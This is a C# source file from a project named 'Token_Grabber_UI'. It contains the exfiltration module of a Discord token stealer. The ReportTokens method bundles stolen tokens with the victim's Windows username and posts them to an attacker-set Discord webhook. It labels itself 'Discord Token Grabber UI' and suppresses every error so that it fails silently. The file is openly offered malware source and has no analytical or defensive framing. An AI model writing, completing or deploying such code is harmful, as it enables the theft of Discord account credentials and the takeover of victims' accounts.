using System;
using System.Collections.Generic;
using System.Net.Http;

namespace Token_Grabber_UI
{
    public static class Webhook
    {
        private static readonly string _hookUrl = "link"; //<< webhook url

        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "Discord Token Grabber UI" },
                        { "avatar_url", "link" } //<< url to avatar imagine
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }
    }
}